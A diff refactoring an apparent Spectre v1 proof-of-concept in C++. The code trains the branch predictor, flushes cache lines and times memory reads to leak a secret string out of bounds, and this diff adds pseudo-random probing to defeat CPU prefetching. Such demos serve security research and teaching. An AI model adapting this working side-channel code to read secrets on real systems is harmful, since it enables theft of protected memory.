@@ -14,15 +14,7 @@
  * limitations under the License.
  */
 
-// TODO(jeanpierreda): Test on ARM.
-// TODO(jeanpierreda): Make this work on GCC.
-// TODO(jeanpierreda): Use a specific public Clang version, document specific CPUs.
-
-#ifdef _MSC_VER
-#include <intrin.h>
-#else
-#include <x86intrin.h>
-#endif
+#include "instr.h"
 
 #include <algorithm>
 #include <array>
@@ -37,18 +29,8 @@
 // ever accessing it in the C++ execution model, using speculative execution and
 // side channel attacks
 //
-// It is far more convenient for the attacker if these are adjacent in memory,
-// since then there is no effort needed to discover the offset for the private
-// value relative to the public value.
-// However, it is not strictly necessary. The secret _could_ be anywhere
-// relative to the string, as long as there is some attacker-controlled value
-// that could reach it during buffer overflow.
 const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
-
-// Forces a memory read of the byte at address p. This will result in the byte
-// being loaded into cache.
-static void force_read(void *p) { (void)*(volatile char *)p; }
 
 // Returns the indices of the biggest and second-biggest values in the range.
 template <typename RangeT>
@@ -108,22 +90,21 @@ static char leak_byte(const char *data, size_t offset) {
     // between accessed and unaccessed pages (modulo e.g. TLB lookups).
     std::array<unsigned char, 4096> padding_ = {};
   };
-  std::vector<BigByte> oracle_array(257);
-  // The first value is adjacent to other elements on the stack, so
-  // we only use the other elements, which are guaranteed to be on different
+  std::vector<BigByte> oracle_array(258);
+  // The first and last value might be adjacent to other elements on the heap,
+  // so we only use the other elements, which are guaranteed to be on different
   // cache lines, and even different pages, than any other value.
   BigByte* isolated_oracle = &oracle_array[1];
 
   // The size needs to be unloaded from cache to force speculative execution
-  // to guess the result of comparison. It could be stored on the stack, >=4096
-  // bytes away from any other values we use we use (which will be loaded into
-  // cache). In this demo, it is more convenient to store it on the heap:
-  // it is the _only_) heap-allocated value in this program, and easily removed
-  // from cache.
+  // to guess the result of comparison.
+  //
+  // TODO: since size_in_heap is no longer the only heap-allocated value, it
+  // should be allocated into its own unique page
   auto size_in_heap = new size_t(strlen(data));
 
-  std::array<int64_t, 256> latencies = {};
-  std::array<int64_t, 256> sorted_latencies = {};
+  std::array<uint64_t, 256> latencies = {};
+  std::array<uint64_t, 256> sorted_latencies = {};
   std::array<int, 256> scores = {};
   size_t best_val = 0, runner_up_val = 0;
 
@@ -131,17 +112,7 @@ static char leak_byte(const char *data, size_t offset) {
     // Flush out entries from the timing array. Now, if they are loaded during
     // speculative execution, that will warm the cache for that entry, which
     // can be detected later via timing analysis.
-    for (size_t i = 0; i < 256; ++i) _mm_clflush(&isolated_oracle[i]);
-    // Clflush is not ordered with respect to reads, so it is necessary to place
-    // the mfence instruction here so that the clflushes retire before the
-    // force_read calls below.
-    // "Performs a serializing operation on all load-from-memory and
-    // store-to-memory instructions that were issued prior the MFENCE
-    // instruction. This serializing operation guarantees that every load and
-    // store instruction that precedes the MFENCE instruction in program order
-    // becomes globally visible before any load or store instruction that
-    // follows the MFENCE instruction."
-    _mm_mfence();
+    for (size_t i = 0; i < 256; ++i) CLFlush(&isolated_oracle[i]);
 
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
@@ -155,8 +126,7 @@ static char leak_byte(const char *data, size_t offset) {
     for (size_t i = 0; i < 2048; ++i) {
       // Remove from cache so that we block on loading it from memory,
       // triggering speculative execution.
-      _mm_clflush(size_in_heap);
-      _mm_mfence();
+      CLFlush(size_in_heap);
 
       // Train the branch predictor: perform in-bounds accesses 2047 times,
       // and then use the out-of-bounds offset we _actually_ care about on the
@@ -173,7 +143,7 @@ static char leak_byte(const char *data, size_t offset) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the tenth iteration, when the
         // condition is false!
-        force_read(&isolated_oracle[(size_t) (data[local_offset])]);
+        ForceRead(&isolated_oracle[(size_t) (data[local_offset])]);
       }
     }
 
@@ -187,32 +157,21 @@ static char leak_byte(const char *data, size_t offset) {
     // want to know at i, the data from this run will be useless, but later runs
     // will use a different safe_offset.
     for (size_t i = 0; i < 256; ++i) {
-      // NOTE: a sufficiently smart compiler (or CPU) might pre-fetch the
-      // cache lines, rendering them all equally fast. It may be necessary in
-      // that case to try to confuse it by accessing the offsets in a
-      // (pseudo-)random order, or some other trick.
-      // On the CPUs this has been tested on, placing values 4096 bytes apart
-      // is sufficient to defeat prefetching.
-      void *timing_entry = &isolated_oracle[i];
-      _mm_mfence();
-      _mm_lfence();
-      int64_t start = __rdtsc();
-      _mm_lfence();
-      force_read(timing_entry);
-      _mm_mfence(); // Necessary for x86 MSVC.
-      _mm_lfence();
-      sorted_latencies[i] = latencies[i] = __rdtsc() - start;
-      _mm_mfence(); // Necessary for x86 MSVC.
-      _mm_lfence(); // Necessary for x86 MSVC.
+      // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
+      // them all equally fast. Therefore it is necessary to confuse them by
+      // accessing the offsets in a pseudo-random order.
+      size_t mixed_i = ((i * 167) + 13) & 0xFF;
+      void *timing_entry = &isolated_oracle[mixed_i];
+      sorted_latencies[mixed_i] = latencies[mixed_i] = ReadLatency(timing_entry);
     }
 
     std::sort(sorted_latencies.begin(), sorted_latencies.end());
-    int64_t median_latency = sorted_latencies[128];
+    uint64_t median_latency = sorted_latencies[128];
 
     // The difference between a cache-hit and cache-miss times is significantly
     // different across platforms. Therefore we must first compute its estimate
     // using the safe_offset which should be a cache-hit.
-    int64_t hitmiss_diff = median_latency - latencies[data[safe_offset]];
+    uint64_t hitmiss_diff = median_latency - latencies[data[safe_offset]];
     int hitcount = 0;
     for (size_t i = 0; i < 256; ++i) {
       if (latencies[i] < median_latency - hitmiss_diff / 2 &&
